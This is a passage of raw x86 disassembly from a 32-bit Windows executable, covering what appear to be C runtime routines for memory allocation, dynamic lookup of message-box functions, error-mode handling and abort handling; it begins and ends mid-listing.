  406d4b:	57                   	push   %edi
  406d4c:	57                   	push   %edi
  406d4d:	57                   	push   %edi
  406d4e:	57                   	push   %edi
  406d4f:	e8 a6 a4 ff ff       	call   0x4011fa
  406d54:	83 c4 14             	add    $0x14,%esp
  406d57:	33 c0                	xor    %eax,%eax
  406d59:	e9 d5 00 00 00       	jmp    0x406e33
  406d5e:	0f af 4d 0c          	imul   0xc(%ebp),%ecx
  406d62:	8b f1                	mov    %ecx,%esi
  406d64:	89 75 08             	mov    %esi,0x8(%ebp)
  406d67:	3b f7                	cmp    %edi,%esi
  406d69:	75 03                	jne    0x406d6e
  406d6b:	33 f6                	xor    %esi,%esi
  406d6d:	46                   	inc    %esi
  406d6e:	33 db                	xor    %ebx,%ebx
  406d70:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  406d73:	83 fe e0             	cmp    $0xffffffe0,%esi
  406d76:	77 69                	ja     0x406de1
  406d78:	83 3d f8 d8 40 00 03 	cmpl   $0x3,0x40d8f8
  406d7f:	75 4b                	jne    0x406dcc
  406d81:	83 c6 0f             	add    $0xf,%esi
  406d84:	83 e6 f0             	and    $0xfffffff0,%esi
  406d87:	89 75 0c             	mov    %esi,0xc(%ebp)
  406d8a:	8b 45 08             	mov    0x8(%ebp),%eax
  406d8d:	3b 05 e8 d8 40 00    	cmp    0x40d8e8,%eax
  406d93:	77 37                	ja     0x406dcc
  406d95:	6a 04                	push   $0x4
  406d97:	e8 e2 c5 ff ff       	call   0x40337e
  406d9c:	59                   	pop    %ecx
  406d9d:	89 7d fc             	mov    %edi,-0x4(%ebp)
  406da0:	ff 75 08             	push   0x8(%ebp)
  406da3:	e8 91 e7 ff ff       	call   0x405539
  406da8:	59                   	pop    %ecx
  406da9:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  406dac:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  406db3:	e8 5f 00 00 00       	call   0x406e17
  406db8:	8b 5d e4             	mov    -0x1c(%ebp),%ebx
  406dbb:	3b df                	cmp    %edi,%ebx
  406dbd:	74 11                	je     0x406dd0
  406dbf:	ff 75 08             	push   0x8(%ebp)
  406dc2:	57                   	push   %edi
  406dc3:	53                   	push   %ebx
  406dc4:	e8 97 b1 ff ff       	call   0x401f60
  406dc9:	83 c4 0c             	add    $0xc,%esp
  406dcc:	3b df                	cmp    %edi,%ebx
  406dce:	75 61                	jne    0x406e31
  406dd0:	56                   	push   %esi
  406dd1:	6a 08                	push   $0x8
  406dd3:	ff 35 94 d5 40 00    	push   0x40d594
  406dd9:	ff 15 d0 90 40 00    	call   *0x4090d0
  406ddf:	8b d8                	mov    %eax,%ebx
  406de1:	3b df                	cmp    %edi,%ebx
  406de3:	75 4c                	jne    0x406e31
  406de5:	39 3d 9c d5 40 00    	cmp    %edi,0x40d59c
  406deb:	74 33                	je     0x406e20
  406ded:	56                   	push   %esi
  406dee:	e8 79 dc ff ff       	call   0x404a6c
  406df3:	59                   	pop    %ecx
  406df4:	85 c0                	test   %eax,%eax
  406df6:	0f 85 72 ff ff ff    	jne    0x406d6e
  406dfc:	8b 45 10             	mov    0x10(%ebp),%eax
  406dff:	3b c7                	cmp    %edi,%eax
  406e01:	0f 84 50 ff ff ff    	je     0x406d57
  406e07:	c7 00 0c 00 00 00    	movl   $0xc,(%eax)
  406e0d:	e9 45 ff ff ff       	jmp    0x406d57
  406e12:	33 ff                	xor    %edi,%edi
  406e14:	8b 75 0c             	mov    0xc(%ebp),%esi
  406e17:	6a 04                	push   $0x4
  406e19:	e8 88 c4 ff ff       	call   0x4032a6
  406e1e:	59                   	pop    %ecx
  406e1f:	c3                   	ret
  406e20:	3b df                	cmp    %edi,%ebx
  406e22:	75 0d                	jne    0x406e31
  406e24:	8b 45 10             	mov    0x10(%ebp),%eax
  406e27:	3b c7                	cmp    %edi,%eax
  406e29:	74 06                	je     0x406e31
  406e2b:	c7 00 0c 00 00 00    	movl   $0xc,(%eax)
  406e31:	8b c3                	mov    %ebx,%eax
  406e33:	e8 61 d1 ff ff       	call   0x403f99
  406e38:	c3                   	ret
  406e39:	6a 10                	push   $0x10
  406e3b:	68 f0 af 40 00       	push   $0x40aff0
  406e40:	e8 0f d1 ff ff       	call   0x403f54
  406e45:	8b 5d 08             	mov    0x8(%ebp),%ebx
  406e48:	85 db                	test   %ebx,%ebx
  406e4a:	75 0e                	jne    0x406e5a
  406e4c:	ff 75 0c             	push   0xc(%ebp)
  406e4f:	e8 18 bf ff ff       	call   0x402d6c
  406e54:	59                   	pop    %ecx
  406e55:	e9 cc 01 00 00       	jmp    0x407026
  406e5a:	8b 75 0c             	mov    0xc(%ebp),%esi
  406e5d:	85 f6                	test   %esi,%esi
  406e5f:	75 0c                	jne    0x406e6d
  406e61:	53                   	push   %ebx
  406e62:	e8 28 be ff ff       	call   0x402c8f
  406e67:	59                   	pop    %ecx
  406e68:	e9 b7 01 00 00       	jmp    0x407024
  406e6d:	83 3d f8 d8 40 00 03 	cmpl   $0x3,0x40d8f8
  406e74:	0f 85 93 01 00 00    	jne    0x40700d
  406e7a:	33 ff                	xor    %edi,%edi
  406e7c:	89 7d e4             	mov    %edi,-0x1c(%ebp)
  406e7f:	83 fe e0             	cmp    $0xffffffe0,%esi
  406e82:	0f 87 8a 01 00 00    	ja     0x407012
  406e88:	6a 04                	push   $0x4
  406e8a:	e8 ef c4 ff ff       	call   0x40337e
  406e8f:	59                   	pop    %ecx
  406e90:	89 7d fc             	mov    %edi,-0x4(%ebp)
  406e93:	53                   	push   %ebx
  406e94:	e8 cc de ff ff       	call   0x404d65
  406e99:	59                   	pop    %ecx
  406e9a:	89 45 e0             	mov    %eax,-0x20(%ebp)
  406e9d:	3b c7                	cmp    %edi,%eax
  406e9f:	0f 84 9e 00 00 00    	je     0x406f43
  406ea5:	3b 35 e8 d8 40 00    	cmp    0x40d8e8,%esi
  406eab:	77 49                	ja     0x406ef6
  406ead:	56                   	push   %esi
  406eae:	53                   	push   %ebx
  406eaf:	50                   	push   %eax
  406eb0:	e8 a5 e3 ff ff       	call   0x40525a
  406eb5:	83 c4 0c             	add    $0xc,%esp
  406eb8:	85 c0                	test   %eax,%eax
  406eba:	74 05                	je     0x406ec1
  406ebc:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  406ebf:	eb 35                	jmp    0x406ef6
  406ec1:	56                   	push   %esi
  406ec2:	e8 72 e6 ff ff       	call   0x405539
  406ec7:	59                   	pop    %ecx
  406ec8:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  406ecb:	3b c7                	cmp    %edi,%eax
  406ecd:	74 27                	je     0x406ef6
  406ecf:	8b 43 fc             	mov    -0x4(%ebx),%eax
  406ed2:	48                   	dec    %eax
  406ed3:	3b c6                	cmp    %esi,%eax
  406ed5:	72 02                	jb     0x406ed9
  406ed7:	8b c6                	mov    %esi,%eax
  406ed9:	50                   	push   %eax
  406eda:	53                   	push   %ebx
  406edb:	ff 75 e4             	push   -0x1c(%ebp)
  406ede:	e8 1d ba ff ff       	call   0x402900
  406ee3:	53                   	push   %ebx
  406ee4:	e8 7c de ff ff       	call   0x404d65
  406ee9:	89 45 e0             	mov    %eax,-0x20(%ebp)
  406eec:	53                   	push   %ebx
  406eed:	50                   	push   %eax
  406eee:	e8 9d de ff ff       	call   0x404d90
  406ef3:	83 c4 18             	add    $0x18,%esp
  406ef6:	39 7d e4             	cmp    %edi,-0x1c(%ebp)
  406ef9:	75 48                	jne    0x406f43
  406efb:	3b f7                	cmp    %edi,%esi
  406efd:	75 06                	jne    0x406f05
  406eff:	33 f6                	xor    %esi,%esi
  406f01:	46                   	inc    %esi
  406f02:	89 75 0c             	mov    %esi,0xc(%ebp)
  406f05:	83 c6 0f             	add    $0xf,%esi
  406f08:	83 e6 f0             	and    $0xfffffff0,%esi
  406f0b:	89 75 0c             	mov    %esi,0xc(%ebp)
  406f0e:	56                   	push   %esi
  406f0f:	57                   	push   %edi
  406f10:	ff 35 94 d5 40 00    	push   0x40d594
  406f16:	ff 15 d0 90 40 00    	call   *0x4090d0
  406f1c:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  406f1f:	3b c7                	cmp    %edi,%eax
  406f21:	74 20                	je     0x406f43
  406f23:	8b 43 fc             	mov    -0x4(%ebx),%eax
  406f26:	48                   	dec    %eax
  406f27:	3b c6                	cmp    %esi,%eax
  406f29:	72 02                	jb     0x406f2d
  406f2b:	8b c6                	mov    %esi,%eax
  406f2d:	50                   	push   %eax
  406f2e:	53                   	push   %ebx
  406f2f:	ff 75 e4             	push   -0x1c(%ebp)
  406f32:	e8 c9 b9 ff ff       	call   0x402900
  406f37:	53                   	push   %ebx
  406f38:	ff 75 e0             	push   -0x20(%ebp)
  406f3b:	e8 50 de ff ff       	call   0x404d90
  406f40:	83 c4 14             	add    $0x14,%esp
  406f43:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  406f4a:	e8 2e 00 00 00       	call   0x406f7d
  406f4f:	83 7d e0 00          	cmpl   $0x0,-0x20(%ebp)
  406f53:	75 31                	jne    0x406f86
  406f55:	85 f6                	test   %esi,%esi
  406f57:	75 01                	jne    0x406f5a
  406f59:	46                   	inc    %esi
  406f5a:	83 c6 0f             	add    $0xf,%esi
  406f5d:	83 e6 f0             	and    $0xfffffff0,%esi
  406f60:	89 75 0c             	mov    %esi,0xc(%ebp)
  406f63:	56                   	push   %esi
  406f64:	53                   	push   %ebx
  406f65:	6a 00                	push   $0x0
  406f67:	ff 35 94 d5 40 00    	push   0x40d594
  406f6d:	ff 15 1c 91 40 00    	call   *0x40911c
  406f73:	8b f8                	mov    %eax,%edi
  406f75:	eb 12                	jmp    0x406f89
  406f77:	8b 75 0c             	mov    0xc(%ebp),%esi
  406f7a:	8b 5d 08             	mov    0x8(%ebp),%ebx
  406f7d:	6a 04                	push   $0x4
  406f7f:	e8 22 c3 ff ff       	call   0x4032a6
  406f84:	59                   	pop    %ecx
  406f85:	c3                   	ret
  406f86:	8b 7d e4             	mov    -0x1c(%ebp),%edi
  406f89:	85 ff                	test   %edi,%edi
  406f8b:	0f 85 bf 00 00 00    	jne    0x407050
  406f91:	39 3d 9c d5 40 00    	cmp    %edi,0x40d59c
  406f97:	74 2c                	je     0x406fc5
  406f99:	56                   	push   %esi
  406f9a:	e8 cd da ff ff       	call   0x404a6c
  406f9f:	59                   	pop    %ecx
  406fa0:	85 c0                	test   %eax,%eax
  406fa2:	0f 85 d2 fe ff ff    	jne    0x406e7a
  406fa8:	e8 80 d4 ff ff       	call   0x40442d
  406fad:	39 7d e0             	cmp    %edi,-0x20(%ebp)
  406fb0:	75 6c                	jne    0x40701e
  406fb2:	8b f0                	mov    %eax,%esi
  406fb4:	ff 15 c0 90 40 00    	call   *0x4090c0
  406fba:	50                   	push   %eax
  406fbb:	e8 32 d4 ff ff       	call   0x4043f2
  406fc0:	59                   	pop    %ecx
  406fc1:	89 06                	mov    %eax,(%esi)
  406fc3:	eb 5f                	jmp    0x407024
  406fc5:	85 ff                	test   %edi,%edi
  406fc7:	0f 85 83 00 00 00    	jne    0x407050
  406fcd:	e8 5b d4 ff ff       	call   0x40442d
  406fd2:	39 7d e0             	cmp    %edi,-0x20(%ebp)
  406fd5:	74 68                	je     0x40703f
  406fd7:	c7 00 0c 00 00 00    	movl   $0xc,(%eax)
  406fdd:	eb 71                	jmp    0x407050
  406fdf:	85 f6                	test   %esi,%esi
  406fe1:	75 01                	jne    0x406fe4
  406fe3:	46                   	inc    %esi
  406fe4:	56                   	push   %esi
  406fe5:	53                   	push   %ebx
  406fe6:	6a 00                	push   $0x0
  406fe8:	ff 35 94 d5 40 00    	push   0x40d594
  406fee:	ff 15 1c 91 40 00    	call   *0x40911c
  406ff4:	8b f8                	mov    %eax,%edi
  406ff6:	85 ff                	test   %edi,%edi
  406ff8:	75 56                	jne    0x407050
  406ffa:	39 05 9c d5 40 00    	cmp    %eax,0x40d59c
  407000:	74 34                	je     0x407036
  407002:	56                   	push   %esi
  407003:	e8 64 da ff ff       	call   0x404a6c
  407008:	59                   	pop    %ecx
  407009:	85 c0                	test   %eax,%eax
  40700b:	74 1f                	je     0x40702c
  40700d:	83 fe e0             	cmp    $0xffffffe0,%esi
  407010:	76 cd                	jbe    0x406fdf
  407012:	56                   	push   %esi
  407013:	e8 54 da ff ff       	call   0x404a6c
  407018:	59                   	pop    %ecx
  407019:	e8 0f d4 ff ff       	call   0x40442d
  40701e:	c7 00 0c 00 00 00    	movl   $0xc,(%eax)
  407024:	33 c0                	xor    %eax,%eax
  407026:	e8 6e cf ff ff       	call   0x403f99
  40702b:	c3                   	ret
  40702c:	e8 fc d3 ff ff       	call   0x40442d
  407031:	e9 7c ff ff ff       	jmp    0x406fb2
  407036:	85 ff                	test   %edi,%edi
  407038:	75 16                	jne    0x407050
  40703a:	e8 ee d3 ff ff       	call   0x40442d
  40703f:	8b f0                	mov    %eax,%esi
  407041:	ff 15 c0 90 40 00    	call   *0x4090c0
  407047:	50                   	push   %eax
  407048:	e8 a5 d3 ff ff       	call   0x4043f2
  40704d:	89 06                	mov    %eax,(%esi)
  40704f:	59                   	pop    %ecx
  407050:	8b c7                	mov    %edi,%eax
  407052:	eb d2                	jmp    0x407026
  407054:	55                   	push   %ebp
  407055:	8b ec                	mov    %esp,%ebp
  407057:	83 ec 20             	sub    $0x20,%esp
  40705a:	53                   	push   %ebx
  40705b:	56                   	push   %esi
  40705c:	57                   	push   %edi
  40705d:	e8 61 b0 ff ff       	call   0x4020c3
  407062:	33 db                	xor    %ebx,%ebx
  407064:	39 1d b8 d6 40 00    	cmp    %ebx,0x40d6b8
  40706a:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40706d:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  407070:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  407073:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  407076:	0f 85 ae 00 00 00    	jne    0x40712a
  40707c:	68 1c a5 40 00       	push   $0x40a51c
  407081:	ff 15 4c 90 40 00    	call   *0x40904c
  407087:	8b f8                	mov    %eax,%edi
  407089:	3b fb                	cmp    %ebx,%edi
  40708b:	0f 84 79 01 00 00    	je     0x40720a
  407091:	8b 35 48 90 40 00    	mov    0x409048,%esi
  407097:	68 10 a5 40 00       	push   $0x40a510
  40709c:	57                   	push   %edi
  40709d:	ff d6                	call   *%esi
  40709f:	3b c3                	cmp    %ebx,%eax
  4070a1:	0f 84 63 01 00 00    	je     0x40720a
  4070a7:	50                   	push   %eax
  4070a8:	e8 a8 af ff ff       	call   0x402055
  4070ad:	c7 04 24 00 a5 40 00 	movl   $0x40a500,(%esp)
  4070b4:	57                   	push   %edi
  4070b5:	a3 b8 d6 40 00       	mov    %eax,0x40d6b8
  4070ba:	ff d6                	call   *%esi
  4070bc:	50                   	push   %eax
  4070bd:	e8 93 af ff ff       	call   0x402055
  4070c2:	c7 04 24 ec a4 40 00 	movl   $0x40a4ec,(%esp)
  4070c9:	57                   	push   %edi
  4070ca:	a3 bc d6 40 00       	mov    %eax,0x40d6bc
  4070cf:	ff d6                	call   *%esi
  4070d1:	50                   	push   %eax
  4070d2:	e8 7e af ff ff       	call   0x402055
  4070d7:	a3 c0 d6 40 00       	mov    %eax,0x40d6c0
  4070dc:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4070df:	50                   	push   %eax
  4070e0:	e8 69 b5 ff ff       	call   0x40264e
  4070e5:	85 c0                	test   %eax,%eax
  4070e7:	59                   	pop    %ecx
  4070e8:	59                   	pop    %ecx
  4070e9:	74 0d                	je     0x4070f8
  4070eb:	53                   	push   %ebx
  4070ec:	53                   	push   %ebx
  4070ed:	53                   	push   %ebx
  4070ee:	53                   	push   %ebx
  4070ef:	53                   	push   %ebx
  4070f0:	e8 15 a0 ff ff       	call   0x40110a
  4070f5:	83 c4 14             	add    $0x14,%esp
  4070f8:	83 7d f4 02          	cmpl   $0x2,-0xc(%ebp)
  4070fc:	75 2c                	jne    0x40712a
  4070fe:	68 d0 a4 40 00       	push   $0x40a4d0
  407103:	57                   	push   %edi
  407104:	ff d6                	call   *%esi
  407106:	50                   	push   %eax
  407107:	e8 49 af ff ff       	call   0x402055
  40710c:	3b c3                	cmp    %ebx,%eax
  40710e:	59                   	pop    %ecx
  40710f:	a3 c8 d6 40 00       	mov    %eax,0x40d6c8
  407114:	74 14                	je     0x40712a
  407116:	68 b8 a4 40 00       	push   $0x40a4b8
  40711b:	57                   	push   %edi
  40711c:	ff d6                	call   *%esi
  40711e:	50                   	push   %eax
  40711f:	e8 31 af ff ff       	call   0x402055
  407124:	59                   	pop    %ecx
  407125:	a3 c4 d6 40 00       	mov    %eax,0x40d6c4
  40712a:	a1 c4 d6 40 00       	mov    0x40d6c4,%eax
  40712f:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  407132:	3b c1                	cmp    %ecx,%eax
  407134:	74 79                	je     0x4071af
  407136:	39 0d c8 d6 40 00    	cmp    %ecx,0x40d6c8
  40713c:	74 71                	je     0x4071af
  40713e:	50                   	push   %eax
  40713f:	e8 88 af ff ff       	call   0x4020cc
  407144:	ff 35 c8 d6 40 00    	push   0x40d6c8
  40714a:	8b f0                	mov    %eax,%esi
  40714c:	e8 7b af ff ff       	call   0x4020cc
  407151:	3b f3                	cmp    %ebx,%esi
  407153:	59                   	pop    %ecx
  407154:	59                   	pop    %ecx
  407155:	8b f8                	mov    %eax,%edi
  407157:	74 56                	je     0x4071af
  407159:	3b fb                	cmp    %ebx,%edi
  40715b:	74 52                	je     0x4071af
  40715d:	ff d6                	call   *%esi
  40715f:	3b c3                	cmp    %ebx,%eax
  407161:	74 19                	je     0x40717c
  407163:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  407166:	51                   	push   %ecx
  407167:	6a 0c                	push   $0xc
  407169:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  40716c:	51                   	push   %ecx
  40716d:	6a 01                	push   $0x1
  40716f:	50                   	push   %eax
  407170:	ff d7                	call   *%edi
  407172:	85 c0                	test   %eax,%eax
  407174:	74 06                	je     0x40717c
  407176:	f6 45 e8 01          	testb  $0x1,-0x18(%ebp)
  40717a:	75 33                	jne    0x4071af
  40717c:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40717f:	50                   	push   %eax
  407180:	e8 00 b5 ff ff       	call   0x402685
  407185:	85 c0                	test   %eax,%eax
  407187:	59                   	pop    %ecx
  407188:	74 0d                	je     0x407197
  40718a:	53                   	push   %ebx
  40718b:	53                   	push   %ebx
  40718c:	53                   	push   %ebx
  40718d:	53                   	push   %ebx
  40718e:	53                   	push   %ebx
  40718f:	e8 76 9f ff ff       	call   0x40110a
  407194:	83 c4 14             	add    $0x14,%esp
  407197:	83 7d f0 04          	cmpl   $0x4,-0x10(%ebp)
  40719b:	72 09                	jb     0x4071a6
  40719d:	81 4d 10 00 00 20 00 	orl    $0x200000,0x10(%ebp)
  4071a4:	eb 44                	jmp    0x4071ea
  4071a6:	81 4d 10 00 00 04 00 	orl    $0x40000,0x10(%ebp)
  4071ad:	eb 3b                	jmp    0x4071ea
  4071af:	a1 bc d6 40 00       	mov    0x40d6bc,%eax
  4071b4:	3b 45 f8             	cmp    -0x8(%ebp),%eax
  4071b7:	74 31                	je     0x4071ea
  4071b9:	50                   	push   %eax
  4071ba:	e8 0d af ff ff       	call   0x4020cc
  4071bf:	3b c3                	cmp    %ebx,%eax
  4071c1:	59                   	pop    %ecx
  4071c2:	74 26                	je     0x4071ea
  4071c4:	ff d0                	call   *%eax
  4071c6:	3b c3                	cmp    %ebx,%eax
  4071c8:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4071cb:	74 1d                	je     0x4071ea
  4071cd:	a1 c0 d6 40 00       	mov    0x40d6c0,%eax
  4071d2:	3b 45 f8             	cmp    -0x8(%ebp),%eax
  4071d5:	74 13                	je     0x4071ea
  4071d7:	50                   	push   %eax
  4071d8:	e8 ef ae ff ff       	call   0x4020cc
  4071dd:	3b c3                	cmp    %ebx,%eax
  4071df:	59                   	pop    %ecx
  4071e0:	74 08                	je     0x4071ea
  4071e2:	ff 75 fc             	push   -0x4(%ebp)
  4071e5:	ff d0                	call   *%eax
  4071e7:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4071ea:	ff 35 b8 d6 40 00    	push   0x40d6b8
  4071f0:	e8 d7 ae ff ff       	call   0x4020cc
  4071f5:	3b c3                	cmp    %ebx,%eax
  4071f7:	59                   	pop    %ecx
  4071f8:	74 10                	je     0x40720a
  4071fa:	ff 75 10             	push   0x10(%ebp)
  4071fd:	ff 75 0c             	push   0xc(%ebp)
  407200:	ff 75 08             	push   0x8(%ebp)
  407203:	ff 75 fc             	push   -0x4(%ebp)
  407206:	ff d0                	call   *%eax
  407208:	eb 02                	jmp    0x40720c
  40720a:	33 c0                	xor    %eax,%eax
  40720c:	5f                   	pop    %edi
  40720d:	5e                   	pop    %esi
  40720e:	5b                   	pop    %ebx
  40720f:	c9                   	leave
  407210:	c3                   	ret
  407211:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  407215:	56                   	push   %esi
  407216:	33 f6                	xor    %esi,%esi
  407218:	3b ce                	cmp    %esi,%ecx
  40721a:	7c 1e                	jl     0x40723a
  40721c:	83 f9 02             	cmp    $0x2,%ecx
  40721f:	7e 0c                	jle    0x40722d
  407221:	83 f9 03             	cmp    $0x3,%ecx
  407224:	75 14                	jne    0x40723a
  407226:	a1 a8 d0 40 00       	mov    0x40d0a8,%eax
  40722b:	5e                   	pop    %esi
  40722c:	c3                   	ret
  40722d:	a1 a8 d0 40 00       	mov    0x40d0a8,%eax
  407232:	89 0d a8 d0 40 00    	mov    %ecx,0x40d0a8
  407238:	5e                   	pop    %esi
  407239:	c3                   	ret
  40723a:	e8 ee d1 ff ff       	call   0x40442d
  40723f:	56                   	push   %esi
  407240:	56                   	push   %esi
  407241:	56                   	push   %esi
  407242:	56                   	push   %esi
  407243:	56                   	push   %esi
  407244:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  40724a:	e8 ab 9f ff ff       	call   0x4011fa
  40724f:	83 c4 14             	add    $0x14,%esp
  407252:	83 c8 ff             	or     $0xffffffff,%eax
  407255:	5e                   	pop    %esi
  407256:	c3                   	ret
  407257:	6a 10                	push   $0x10
  407259:	68 10 b0 40 00       	push   $0x40b010
  40725e:	e8 f1 cc ff ff       	call   0x403f54
  407263:	33 c0                	xor    %eax,%eax
  407265:	8b 5d 08             	mov    0x8(%ebp),%ebx
  407268:	33 ff                	xor    %edi,%edi
  40726a:	3b df                	cmp    %edi,%ebx
  40726c:	0f 95 c0             	setne  %al
  40726f:	3b c7                	cmp    %edi,%eax
  407271:	75 1d                	jne    0x407290
  407273:	e8 b5 d1 ff ff       	call   0x40442d
  407278:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  40727e:	57                   	push   %edi
  40727f:	57                   	push   %edi
  407280:	57                   	push   %edi
  407281:	57                   	push   %edi
  407282:	57                   	push   %edi
  407283:	e8 72 9f ff ff       	call   0x4011fa
  407288:	83 c4 14             	add    $0x14,%esp
  40728b:	83 c8 ff             	or     $0xffffffff,%eax
  40728e:	eb 53                	jmp    0x4072e3
  407290:	83 3d f8 d8 40 00 03 	cmpl   $0x3,0x40d8f8
  407297:	75 38                	jne    0x4072d1
  407299:	6a 04                	push   $0x4
  40729b:	e8 de c0 ff ff       	call   0x40337e
  4072a0:	59                   	pop    %ecx
  4072a1:	89 7d fc             	mov    %edi,-0x4(%ebp)
  4072a4:	53                   	push   %ebx
  4072a5:	e8 bb da ff ff       	call   0x404d65
  4072aa:	59                   	pop    %ecx
  4072ab:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4072ae:	3b c7                	cmp    %edi,%eax
  4072b0:	74 0b                	je     0x4072bd
  4072b2:	8b 73 fc             	mov    -0x4(%ebx),%esi
  4072b5:	83 ee 09             	sub    $0x9,%esi
  4072b8:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  4072bb:	eb 03                	jmp    0x4072c0
  4072bd:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  4072c0:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4072c7:	e8 25 00 00 00       	call   0x4072f1
  4072cc:	39 7d e0             	cmp    %edi,-0x20(%ebp)
  4072cf:	75 10                	jne    0x4072e1
  4072d1:	53                   	push   %ebx
  4072d2:	57                   	push   %edi
  4072d3:	ff 35 94 d5 40 00    	push   0x40d594
  4072d9:	ff 15 78 90 40 00    	call   *0x409078
  4072df:	8b f0                	mov    %eax,%esi
  4072e1:	8b c6                	mov    %esi,%eax
  4072e3:	e8 b1 cc ff ff       	call   0x403f99
  4072e8:	c3                   	ret
  4072e9:	33 ff                	xor    %edi,%edi
  4072eb:	8b 5d 08             	mov    0x8(%ebp),%ebx
  4072ee:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  4072f1:	6a 04                	push   $0x4
  4072f3:	e8 ae bf ff ff       	call   0x4032a6
  4072f8:	59                   	pop    %ecx
  4072f9:	c3                   	ret
  4072fa:	6a 02                	push   $0x2
  4072fc:	e8 a4 b2 ff ff       	call   0x4025a5
  407301:	59                   	pop    %ecx
  407302:	c3                   	ret
  407303:	55                   	push   %ebp
  407304:	8d ac 24 58 fd ff ff 	lea    -0x2a8(%esp),%ebp
  40730b:	81 ec 28 03 00 00    	sub    $0x328,%esp
  407311:	a1 20 c0 40 00       	mov    0x40c020,%eax
  407316:	33 c5                	xor    %ebp,%eax
  407318:	89 85 a4 02 00 00    	mov    %eax,0x2a4(%ebp)
  40731e:	f6 05 d0 cb 40 00 01 	testb  $0x1,0x40cbd0
  407325:	56                   	push   %esi
  407326:	74 08                	je     0x407330
  407328:	6a 0a                	push   $0xa
  40732a:	e8 ea ce ff ff       	call   0x404219
  40732f:	59                   	pop    %ecx
  407330:	e8 7d d4 ff ff       	call   0x4047b2
  407335:	85 c0                	test   %eax,%eax
  407337:	74 08                	je     0x407341
  407339:	6a 16                	push   $0x16
  40733b:	e8 7f d4 ff ff       	call   0x4047bf
  407340:	59                   	pop    %ecx
  407341:	f6 05 d0 cb 40 00 02 	testb  $0x2,0x40cbd0
  407348:	0f 84 a0 00 00 00    	je     0x4073ee
  40734e:	89 85 88 00 00 00    	mov    %eax,0x88(%ebp)
  407354:	89 8d 84 00 00 00    	mov    %ecx,0x84(%ebp)
  40735a:	89 95 80 00 00 00    	mov    %edx,0x80(%ebp)
  407360:	89 5d 7c             	mov    %ebx,0x7c(%ebp)
  407363:	89 75 78             	mov    %esi,0x78(%ebp)
  407366:	89 7d 74             	mov    %edi,0x74(%ebp)
  407369:	66 8c 95 a0 00 00 00 	data16 mov %ss,0xa0(%ebp)
  407370:	66 8c 8d 94 00 00 00 	data16 mov %cs,0x94(%ebp)
  407377:	66 8c 5d 70          	data16 mov %ds,0x70(%ebp)
  40737b:	66 8c 45 6c          	data16 mov %es,0x6c(%ebp)
  40737f:	66 8c 65 68          	data16 mov %fs,0x68(%ebp)
  407383:	66 8c 6d 64          	data16 mov %gs,0x64(%ebp)
  407387:	9c                   	pushf
  407388:	8f 85 98 00 00 00    	pop    0x98(%ebp)
  40738e:	8b b5 ac 02 00 00    	mov    0x2ac(%ebp),%esi
  407394:	8d 85 ac 02 00 00    	lea    0x2ac(%ebp),%eax
  40739a:	89 85 9c 00 00 00    	mov    %eax,0x9c(%ebp)
  4073a0:	c7 45 d8 01 00 01 00 	movl   $0x10001,-0x28(%ebp)
  4073a7:	89 b5 90 00 00 00    	mov    %esi,0x90(%ebp)
  4073ad:	8b 40 fc             	mov    -0x4(%eax),%eax
  4073b0:	6a 50                	push   $0x50
  4073b2:	89 85 8c 00 00 00    	mov    %eax,0x8c(%ebp)
  4073b8:	8d 45 80             	lea    -0x80(%ebp),%eax
  4073bb:	6a 00                	push   $0x0
  4073bd:	50                   	push   %eax
  4073be:	e8 9d ab ff ff       	call   0x401f60
  4073c3:	8d 45 80             	lea    -0x80(%ebp),%eax
  4073c6:	83 c4 0c             	add    $0xc,%esp
  4073c9:	89 45 d0             	mov    %eax,-0x30(%ebp)
  4073cc:	8d 45 d8             	lea    -0x28(%ebp),%eax
  4073cf:	6a 00                	push   $0x0
  4073d1:	c7 45 80 15 00 00 40 	movl   $0x40000015,-0x80(%ebp)
  4073d8:	89 75 8c             	mov    %esi,-0x74(%ebp)
  4073db:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4073de:	ff 15 0c 90 40 00    	call   *0x40900c
  4073e4:	8d 45 d0             	lea    -0x30(%ebp),%eax
  4073e7:	50                   	push   %eax
  4073e8:	ff 15 54 90 40 00    	call   *0x409054
  4073ee:	6a 03                	push   $0x3
  4073f0:	e8 51 b4 ff ff       	call   0x402846
  4073f5:	cc                   	int3
  4073f6:	cc                   	int3
  4073f7:	cc                   	int3
  4073f8:	cc                   	int3
  4073f9:	cc                   	int3
  4073fa:	cc                   	int3
  4073fb:	cc                   	int3
  4073fc:	cc                   	int3
  4073fd:	cc                   	int3
  4073fe:	cc                   	int3
  4073ff:	cc                   	int3
  407400:	55                   	push   %ebp
  407401:	8b ec                	mov    %esp,%ebp
  407403:	57                   	push   %edi
  407404:	56                   	push   %esi
  407405:	8b 75 0c             	mov    0xc(%ebp),%esi
  407408:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40740b:	8b 7d 08             	mov    0x8(%ebp),%edi
  40740e:	8b c1                	mov    %ecx,%eax
  407410:	8b d1                	mov    %ecx,%edx
  407412:	03 c6                	add    %esi,%eax
  407414:	3b fe                	cmp    %esi,%edi
  407416:	76 08                	jbe    0x407420
  407418:	3b f8                	cmp    %eax,%edi
